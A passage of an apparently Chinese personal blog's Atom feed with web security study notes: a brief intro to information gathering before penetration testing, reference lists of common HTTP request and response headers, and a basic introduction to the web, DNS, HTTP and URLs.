        <link rel="alternate" href="http://avenue.cool/WEB/Information-Gathering/1.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;p&gt;在进行渗透测试之前，最重要的一步就是信息收集，在这个阶段，我们要尽可能的去搜集目标组织的信息。我们越是了解测试目标，测试的工作就越容易，在信息收集中，最重要的是收集服务器的配置信息和网站的敏感信息，其中包括域名和子域名信息，目标网站系统，CMS 指纹，目标网站真实 IP，开放的端口等，换句话说，只要是与目标网站相关的信息，我们都应该尽量收集。&lt;/p&gt;&lt;p&gt;&amp;quot;只有不努力的黑客，没有攻不破的系统&amp;quot;。&lt;br&gt;在 SRC 漏洞挖掘或渗透测试中，信息收集占很大一部分，能收集到别人收集不到的资产，就能挖到别人挖不到的洞。&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="信息收集" scheme="http://avenue.cool/categories/WEB/Information-Gathering/" />
        <category term="信息收集" scheme="http://avenue.cool/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Web-Foundation/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4/</id>
        <title>3. WEB常见的HTTP响应头</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Web-Foundation/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;h2 id=&#34;1-响应报文格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-响应报文格式&#34;&gt;#&lt;/a&gt; （1）、响应报文格式：&lt;/h2&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&amp;lt;version&amp;gt;&amp;lt;status&amp;gt;&amp;lt;reason-phrase&amp;gt;&lt;br&gt;&amp;lt;headers&amp;gt;&lt;br&gt;&amp;lt;entity-body&amp;gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;h2 id=&#34;2-响应头报文&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-响应头报文&#34;&gt;#&lt;/a&gt; （2）、响应头报文：&lt;/h2&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Accept-Ranges&lt;br&gt;表明服务器是否支持指定范围请求及哪种类型的分段请求&lt;br&gt;Accept-Ranges: bytes&lt;/p&gt;&lt;p&gt;Access-Control-Allow-Origin&lt;br&gt;配置有权限访问资源的域&lt;br&gt;Access-Control-Allow-Origin: &amp;lt;origin&amp;gt;|*&lt;/p&gt;&lt;p&gt;Allow&lt;br&gt;对某网络资源的有效的请求行为，不允许则返回 405&lt;br&gt;Allow: GET, HEAD&lt;/p&gt;&lt;p&gt;Cache-Control&lt;br&gt;告诉所有的缓存机制是否可以缓存及哪种类型&lt;br&gt;Cache-Control: no-cache&lt;/p&gt;&lt;p&gt;Content-Encoding&lt;br&gt;web 服务器支持的返回内容压缩编码类型。&lt;br&gt;Content-Encoding: gzip&lt;/p&gt;&lt;p&gt;Content-Language&lt;br&gt;响应体的语言&lt;br&gt;Content-Language: en,zh&lt;/p&gt;&lt;p&gt;Content-Length&lt;br&gt;响应体的长度&lt;br&gt;Content-Length: 348&lt;/p&gt;&lt;p&gt;Content-Location&lt;br&gt;请求资源可替代的备用的另一地址&lt;br&gt;Content-Location: /index.htm&lt;/p&gt;&lt;p&gt;Content-Type&lt;br&gt;返回内容的 MIME 类型&lt;br&gt;Content-Type: text/html; charset=utf-8&lt;/p&gt;&lt;p&gt;Date&lt;br&gt;原始服务器消息发出的时间&lt;br&gt;Date: Tue, 15 Nov 2010 08:12:31 GMT&lt;/p&gt;&lt;p&gt;ETag&lt;br&gt;请求变量的实体标签的当前值&lt;br&gt;ETag: &amp;quot;737060cd8c284d8af7ad3082f209582d&amp;quot;&lt;/p&gt;&lt;p&gt;Location&lt;br&gt;用来重定向接收方到非请求 URL 的位置来完成请求或标识新的资源&lt;br&gt;Location: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvOTQuaHRtbA==&#34;&gt;http://www.zcmhi.com/archives/94.html&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Proxy-Authenticate&lt;br&gt;它指出认证方案和可应用到代理的该 URL 上的参数&lt;br&gt;Proxy-Authenticate: Basic&lt;/p&gt;&lt;p&gt;Refresh&lt;br&gt;应用于重定向或一个新的资源被创造，在 5 秒之后重定向（由网景提出，被大部分浏览器支持）&lt;br&gt;Refresh: 5; url=http://www.zcmhi.com/archives/94.html&lt;/p&gt;&lt;p&gt;Server&lt;br&gt;web 服务器软件名称&lt;br&gt;Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)&lt;/p&gt;&lt;p&gt;Set-Cookie&lt;br&gt;设置 Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1&lt;/p&gt;&lt;p&gt;Strict-Transport-Security&lt;br&gt;设置浏览器强制使用 HTTPS 访问&lt;br&gt;max-age: x 秒的时间内 访问对应域名都使用 HTTPS 请求&lt;br&gt;includeSubDomains: 网站的子域名也启用规则&lt;br&gt;Strict-Transport-Security: max-age=1000; includeSubDomains&lt;/p&gt;&lt;p&gt;X-Frame-Options&lt;br&gt;配置页面是否能出现在 &amp;lt;frame&amp;gt;, &amp;lt;iframe&amp;gt;, &amp;lt;embed&amp;gt;, &amp;lt;object&amp;gt; 等标签中，防止点击劫持&lt;br&gt;X-Frame-Options: deny&lt;br&gt;SAMEORGIN：仅同源域名下的页面匹配时许可&lt;/p&gt;&lt;p&gt;X-XSS-Protection&lt;br&gt;配置 XSS 防护机制&lt;br&gt;X-XSS-Protection: 1; mode=block&lt;/p&gt;&lt;p&gt;HttpOnly：使 JavaScript 脚本无法获取 cookie，防止 xss 攻击。&lt;/p&gt;&lt;p&gt;X-Powered-By：可以知道 web 后端语言（但是可以修改）&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/categories/WEB/Web-Foundation/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/tags/WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Web-Foundation/%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/</id>
        <title>2. 常见的HTTP请求头</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Web-Foundation/%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;常见的-http-请求头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的-http-请求头&#34;&gt;#&lt;/a&gt; 常见的 HTTP 请求头&lt;/h1&gt;&lt;ul&gt;&lt;li&gt;&lt;h2 id=&#34;1-请求报文格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-请求报文格式&#34;&gt;#&lt;/a&gt; （1）、请求报文格式&lt;/h2&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&amp;lt;method&amp;gt;&amp;lt;request-URL&amp;gt;&amp;lt;version&amp;gt;&lt;br&gt;&amp;lt;headers&amp;gt;&lt;br&gt;&amp;lt;entity-body&amp;gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;h2 id=&#34;2请求方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2请求方法&#34;&gt;#&lt;/a&gt; （2）请求方法：&lt;/h2&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;GET：请求指定页面信息，并返回主体，数据插入进 URL 中进行传输。&lt;br&gt;POST：向指定资源提交数据进行请求，数据被放在请求数据体中传输。&lt;br&gt;HEAD：类似 GET 请求，但只获取头部信息，无响应体。&lt;br&gt;PUT：将传输数据取代指定文档传输。&lt;br&gt;DELETE：请求服务器删除指定页面。&lt;br&gt;CONNECT：与代理服务器可以进行管道方式连接。&lt;br&gt;OPTIONS：查询针对请求 URL 指定资源支持的方法。&lt;br&gt;TRACE：可以对请求消息的传输路径追踪。&lt;br&gt;MOVE：请求服务器将指定的页面移动到另一个网络地址上。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;h2 id=&#34;3请求头部常见的请求头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3请求头部常见的请求头&#34;&gt;#&lt;/a&gt; （3）请求头部：（常见的请求头）&lt;/h2&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Accept&lt;br&gt;指定客户端能够接收的内容类型&lt;br&gt;Accept: text/plain, text/html&lt;/p&gt;&lt;p&gt;Accept-Charset&lt;br&gt;浏览器可以接受的字符编码集&lt;br&gt;Accept-Charset: iso-8859-5&lt;/p&gt;&lt;p&gt;Accept-Encoding&lt;br&gt;指定浏览器可以支持的 web 服务器返回内容压缩编码类型&lt;br&gt;Accept-Encoding: compress, gzip&lt;/p&gt;&lt;p&gt;Accept-Language&lt;br&gt;浏览器可接受的语言&lt;br&gt;Accept-Language: en,zh&lt;/p&gt;&lt;p&gt;Authorization&lt;br&gt;HTTP 授权的授权证书&lt;br&gt;Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==&lt;/p&gt;&lt;p&gt;Cache-Control&lt;br&gt;指定请求和响应遵循的缓存机制 Cache-Control: no-cache&lt;/p&gt;&lt;p&gt;Connection&lt;br&gt;表示是否需要持久连接 // HTTP 1.1 默认进行持久连接&lt;br&gt;Connection: close&lt;/p&gt;&lt;p&gt;Cookie&lt;br&gt;HTTP 请求发送时，会把保存在该请求域名下的所有 cookie 值一起发送给 web 服务器&lt;br&gt;Cookie: role=admin;ssid=1&lt;/p&gt;&lt;p&gt;Content-Length&lt;br&gt;请求的内容长度&lt;br&gt;Content-Length: 348&lt;/p&gt;&lt;p&gt;Content-Type&lt;br&gt;请求的与实体对应的 MIME 信息&lt;br&gt;Content-Type: application/x-www-form-urlencoded&lt;/p&gt;&lt;p&gt;Date&lt;br&gt;请求发送的日期和时间&lt;br&gt;Date: Tue, 15 Nov 2010 08:12:31 GMT&lt;/p&gt;&lt;p&gt;Host&lt;br&gt;指定请求的服务器的域名和端口号&lt;br&gt;Host: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5naXRodWIuY29t&#34;&gt;www.github.com&lt;/span&gt;&lt;/p&gt;&lt;p&gt;If-Match&lt;br&gt;只有请求内容与实体相匹配才有效&lt;br&gt;If-Match: &amp;quot;737060cd8c284d8af7ad3082f209582d&amp;quot;&lt;/p&gt;&lt;p&gt;If-Modified-Since&lt;br&gt;如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回 304 代码 (比较资源更新的时间）&lt;br&gt;If-Modified-Since: Sat, 29 Oct 2018 19:43:31 GMT&lt;/p&gt;&lt;p&gt;If-None-Match&lt;br&gt;如果内容未改变返回 304 代码，参数为服务器先前发送的 Etag，与服务器回应的 Etag 比较判断是否改变&lt;br&gt;If-None-Match: &amp;quot;737060cd8c284d8af7ad3082f209582d&amp;quot;&lt;/p&gt;&lt;p&gt;If-Range&lt;br&gt;如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为 Etag&lt;br&gt;If-Range: &amp;quot;737060cd8c284d8af7ad3082f209582d&amp;quot;&lt;/p&gt;&lt;p&gt;Max-Forwards&lt;br&gt;限制信息通过代理和网关传送的时间&lt;br&gt;Max-Forwards: 10&lt;/p&gt;&lt;p&gt;Proxy-Authorization&lt;br&gt;连接到代理的授权证书&lt;br&gt;Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==&lt;/p&gt;&lt;p&gt;Range&lt;br&gt;只请求实体的一部分，指定范围&lt;br&gt;Range: bytes=500-999&lt;/p&gt;&lt;p&gt;Referer&lt;br&gt;先前网页的地址，当前请求网页紧随其后，即来路&lt;br&gt;Referer: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy56Y21oaS5jb20vYXJjaGl2ZXMvNzEuaHRtbA==&#34;&gt;http://www.zcmhi.com/archives/71.html&lt;/span&gt;&lt;/p&gt;&lt;p&gt;User-Agent&lt;br&gt;User-Agent 的内容包含发出请求的用户信息&lt;br&gt;User-Agent: Mozilla/5.0 (Linux; X11)&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/categories/WEB/Web-Foundation/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/tags/WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Web-Foundation/Web%E7%AE%80%E4%BB%8B/</id>
        <title>1. WEB简介</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Web-Foundation/Web%E7%AE%80%E4%BB%8B/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;web-简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-简介&#34;&gt;#&lt;/a&gt; Web 简介&lt;/h1&gt;&lt;h2 id=&#34;1-什么是-web&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-什么是-web&#34;&gt;#&lt;/a&gt; 1、什么是 WEB ？&lt;/h2&gt;&lt;p&gt;既然我们要学习 Web 安全，当然要简单的了解 web 的含义，Web 与现在与我们生活息息相关，通过手机或者电脑刷新闻，看个视频，或者说……(咳咳)。这其中涉及到 几个基本的点，从通信，会接触到 URL，到协议，会接触到 HTTP、HTTPS、HSTS，再到前后端的 概念，前端即 HTML，CSS，JavaScript，三剑客。后端，即处理脚本语言，比如 PHP，JAVA，python，SQL（语句）等等。&lt;/p&gt;&lt;p&gt;WEB：www 全球广域网（World Wide WEB），就是我们所说的万维网。他是一种基于超文本和 HTTP 的、全球性的、动态交互的、跨平台的分布式图形信息系统。是建立在 Internet 上的一种网络服务，为浏览者在 Internet （因特网） 上查找和浏览信息提供了图形化、易于访问的直观界面，其中的文档及超链接将 internet 上的信息节点组织成了一个互为关联的网状结构。&lt;/p&gt;&lt;h2 id=&#34;2-web-发展史&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-web-发展史&#34;&gt;#&lt;/a&gt; 2、WEB 发展史：&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;(1) 静态页面&lt;br&gt;在互联网最初开始的时候，Web 网站的主要内容是静态的，由文字和 图片组成， 制作和表现形式也是以表格为主。当时的用户行为也非常 简单，仅仅是浏览网页就行。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(2) 多媒体阶段&lt;br&gt;随着技术的不断发展，音频、视频、Flash 等多媒体技术诞生了。多媒体的加入 使得网页变得更加生动形象，网页上的交互也给用户带来了更好的体验。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(3) CGI 阶段&lt;br&gt;渐渐的，多媒体已经不能满足人们的请求，于是 CGI（Common Gateway Interface） 应运而生。CGI 定义了 Web 服务器与外部应用程序之间的通信接口标准，因此 Web 服务器可以通过 CGI 执行外部程序，让外部程序根据 Web 请求内容生成动态的内容。&lt;br&gt;在这个时候，各种编程语言如 PHP/ASP/JSP 也逐渐加入市场，基于这些语言可以 实现更加模块化的、功能更强大的应用程序。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(4) AJAX&lt;br&gt;在开始的时候，用户提交整个表单后才能获取结果，用户体验极差。于是 Ajax （Asynchronous Javascript And XML）技术逐渐流行起来，它使得应用在不更新整个页面的前提下也可以获得或更新数据。这使得 Web 应用程序更为迅捷地回 应用户动作，并避免了在网络上发送那些没有改变的信息。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(5) MVC&lt;br&gt;随着 Web 应用开发越来越标准化，出现了 MVC 等思想。MVC 是 Model/View/Control 的缩写，Model 用于封装数据和数据处理方法，视图 View 是数据的 HTML 展现， 控制器 Controller 负责响应请求，协调 Model 和 View。&lt;br&gt;Model，View 和 Controller 的分开，是一种典型的关注点分离的思想，使得代码复用性和组织性更好，Web 应用的配置性和灵活性也越来越好。而数据访问也 逐渐通过面向对象的方式来替代直接的 SQL 访问，出现了 ORM（Object Relation Mapping）的概念。&lt;br&gt;除了 MVC，类似的设计思想还有 MVP，MVVM 等。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(6) RESTful&lt;br&gt;在 CGI 时期，前后端通常是没有做严格区分的，随着解耦和的需求不断增加，前后端的概念开始变得清晰。前端主要指网站前台部分，运行在 PC 端、移动端等 浏览器上展现给用户浏览的网页，由 HTML5、CSS3、JavaScript 组成。后端主要指网站的逻辑部分，涉及数据的增删改查等。&lt;br&gt;此时，REST（Representation State Transformation）逐渐成为一种流行的 Web 架构风格。&lt;br&gt;REST 鼓励基于 URL 来组织系统功能，充分利用 HTTP 本身的语义，而不是仅仅将 HTTP 作为一种远程数据传输协议。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(7) 云服务&lt;br&gt;随着时间的发展，Web 的架构越发复杂，负载均衡、数据库分表、异地容灾、缓 存、CDN、消息队列等技术开始应用，增加了 Web 开发和运维的复杂度。同时云 服务开始逐渐发展，部署环境容器化，各个功能拆成微服务或是 Serverless 的 架构。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;2-web-工作方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-web-工作方式&#34;&gt;#&lt;/a&gt; 2、WEB 工作方式：&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;(1) 什么是 DNS 服务器？&lt;br&gt;DNS（域名系统，Domain Name System）， 它作为将域名和 IP 地址相互映射的一 个分布式数据库，能够使人更方便地访问互联网。&lt;br&gt;通俗来说，这就是一个大型的数据库，里面存放着 URL 以及与其对应的 IP 地址，类比一下就好像字典里的索引，可以根据索引找到内容。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(2) 首先我们会用浏览器访问各种资源，浏览器是客户端角色，当你输入 URL 时，浏览器会首先请求 DNS 服务器，DNS 根据你请求的 URL 返回对应的 IP 地址，接下来，浏览器会带着你请求的信息去访问该 IP 的服务器，来处理你的请求，当服务器接收到了你的请求后，会根据 HTTP 协议所带的数据，来对你的访问进行处理，这个处理就是后端过程，可能使用的是 PHP，可能是 JAVA 语言，或者其他的 ASP、ASPX，处理完成之后再将这些信息返回给客户端，客户端根据返回的数据进行呈现，呈现的网页即为前端，其中包括了 HTML,CSS,JavaScript，基本元素，一个丰富的页面就呈现在了你的眼前。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;img data-src=&#34;/images/web%E5%9F%BA%E7%A1%80/Http.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;h2 id=&#34;三-http-简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-http-简介&#34;&gt;#&lt;/a&gt; 三、HTTP 简介：&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;(1) HTTP（HyperText Transfer Protocol，超文本传输协议），是因特网上应用最为广泛的一种网络传输协议，所有的 WWW 文件都必须遵守这个标准。&lt;br&gt;HTTP 是一个基于 TCP/IP 通信协议来传递数据（HTML 文件，图片文件，查询结果等）。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(2) HTTP 协议属于应用层协议，建立在 TCP 之上，HTTP 协议以客户端请求和服务端应答为标准，浏览器称为客户端，而 web 服务器称为服务器。客户端打开任意端口向服务器的 80 端口发起 http 请求，首先会发起 TCP 三次握手，是为了建立数据连接通道，通道建立成功后，进行 HTTP 数据交互。&lt;br&gt;当客户端请求的数据接收完毕后，HTTP 服务器会断开 TCP 连接，整个 HTTP 连接的过程非常短，HTTP 连接也被称为无状态的连接，无状态连接是指客户端每次向服务器发起 HTTP 请求时，每次请求都会建立一个新的 HTTP 连接，而不是在一个 HTTP 请求基础上进行所有的数据交互。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(3) 发起 HTTP 请求的内容资源由统一资源标识符（Uniform Resource Identifiers，URI）来标识，关于资源定位和标识符有三种：URI 、URN、URL，三种资源定位解释如下：&lt;br&gt;统一资源标识符（Uniform Resource identifier，URI），用来唯一标识一个资源；&lt;br&gt;统一资源定位符（uniform resource locator ， URL），是一种具体的 URI，URL 可以用来标识一个资源，而且访问获取该资源；&lt;br&gt;统一资源命名（uniform resource name，URN），通过名字来标识或识别资源；&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;img data-src=&#34;/images/web%E5%9F%BA%E7%A1%80/URI.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;完整的 URL 标识格式如下：&lt;br&gt;protocol：//host [:port]/path/..../[?query-string][#anchor]&lt;br&gt;protocol // 基于某种协议，常见协议：HTTP、HTTPS、FTP、RSYNC 等；&lt;br&gt;host // 服务器的 IP 地址或者域名；&lt;br&gt;port // 服务器的端口号，如果是 HTTP，默认是 80 端口；&lt;br&gt;path // 访问资源在服务器的路径；&lt;br&gt;query-string // 传递给服务器的参数及字符串&lt;br&gt;anchor // 锚定结束；&lt;/p&gt;&lt;ul&gt;&lt;li&gt;(4) HTTP 请求报文&lt;br&gt;完整的 HTTP 请求包含以下内容，请求方法一般是 GET 和 POST，URL 即你请求的地址，协议版本一般都是 HTTP/1.1，然后配合着请求头，来访问你请求的资源，请求头有通用的，也有厂家自定义的。如果是 POST 请求，会携带请求数据。 GET 请求的数据会在 URL 处携带查询，即我们前面说到的 ？query-string 部分，POST 只不过把查询部分放在了请求报文中，即下面请求数据的部分，这样做的&lt;br&gt;目的是，较为安全的保障所请求的数据。GET 所请求的数据在 URL 中，一般大家都能看到，但是现在不管哪种请求，都或多或少的加入了编码，这样数据不进行特定的方式解码，是看不到具体数据的。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;img data-src=&#34;/images/web%E5%9F%BA%E7%A1%80/Httpheader.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;(5) HTTP 请求方法：&lt;/li&gt;&lt;li&gt;GET：请求指定页面信息，并返回主体，数据插入进 URL 中进行传输。&lt;/li&gt;&lt;li&gt;POST：向指定资源提交数据进行请求，数据被放在请求数据体中传输。&lt;/li&gt;&lt;li&gt;HEAD：类似 GET 请求，但只获取头部信息，无响应体。&lt;/li&gt;&lt;li&gt;PUT：将传输数据取代指定文档传输。&lt;/li&gt;&lt;li&gt;DELETE：请求服务器删除指定页面。&lt;/li&gt;&lt;li&gt;CONNECT：与代理服务器可以进行管道方式连接&lt;/li&gt;&lt;li&gt;OPTIONS：查询针对请求 URL 指定资源支持的方法。&lt;/li&gt;&lt;li&gt;TRACE：可以对请求消息的传输路径追踪。&lt;/li&gt;&lt;li&gt;MOVE：请求服务器将指定的页面移动到另一个网络地址上&lt;/li&gt;&lt;/ul&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/categories/WEB/Web-Foundation/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/tags/WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
</feed>
